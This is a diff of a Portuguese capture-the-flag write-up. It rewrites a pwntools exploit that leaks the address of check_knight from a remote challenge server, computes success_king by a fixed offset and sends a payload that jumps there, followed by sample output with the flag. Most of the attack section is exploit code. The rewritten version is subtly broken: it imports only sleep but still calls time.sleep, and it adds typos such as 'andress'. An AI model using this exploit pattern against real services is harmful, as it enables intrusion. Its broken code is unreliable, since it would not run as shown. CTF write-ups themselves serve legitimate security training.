@@ -144,48 +144,46 @@ tendo tudo que precisamos, é hora do solve
 
 ``` python
 from pwn import *
-import struct
-import time
+from struct import pack, unpack
+from time import sleep
 
-def p(x):
-    return struct.pack("<q", x)
-
-addr = 0
-offset = -37
+def packed(blank):
+    return pack("<q", blank)
 
 r = remote('159.203.38.169', 5683)
 r.recv(1024)
 
-print("[*] Triggering leak...")
-r.send('knightAA' + '\n')
-time.sleep(0.3)
+print("[ok] Bufffer Overflow]... ")
+r.send('0x8bytes' + '\n')
+time.sleep(0.7)
 
-print("[*] Retrieving address of check_knight...")
-resp = r.recv(1024).strip()
-addr = resp[8:14] + '\x00\x00'
-addr = struct.unpack("<q", addr)[0]
+print("[ok] Address of check_knight...")
+output = r.recv(1024).strip()
+andress = output[8:14] + '\x00\x00'
+andress = unpack("<q", andress)[0]
+time.sleep(0.7)
 
-print("[*] Calculating address of success_king...")
-addr += offset
+print("[OK] Address of success_king...")
+andress += -37
+time.sleep(0.7)
 
-print("[*] Calling success_king...")
-r.send('red\0' + '0x00' + '0x000000' + p(addr))
-time.sleep(0.3)
+print("[OK] Success_king...")
+r.send('red\0' + '0x00' + '0x000000' + packed(andress))
+time.sleep(0.7)
 
-resp = r.recv(1024)
-print(resp[resp.find('FLAG'):])
+output = r.recv(1024)
+print(output[output.find('\nFLAG'):])
 r.close()
 ```
 
 ``` c
 [+] Opening connection to 159.203.38.169 on port 5683: Done
-[*] Triggering leak...
-[*] Retrieving address of check_knight...
-[*] Calculating address of success_king...
-[*] Calling success_king...
-FLAG{Y0uCr0ss3dTh3Br1g30fD3ath}
+[ok] Bufffer Overflow]... 
+[ok] Address of check_knight...
+[OK] Address of success_king...
+[OK] Success_king...
 
-[*] Closed connection to 159.203.38.169 port 5683
+FLAG{Y0uCr0ss3dTh3Br1g30fD3ath}
 ```
 
 `FLAG{Y0uCr0ss3dTh3Br1g30fD3ath}`
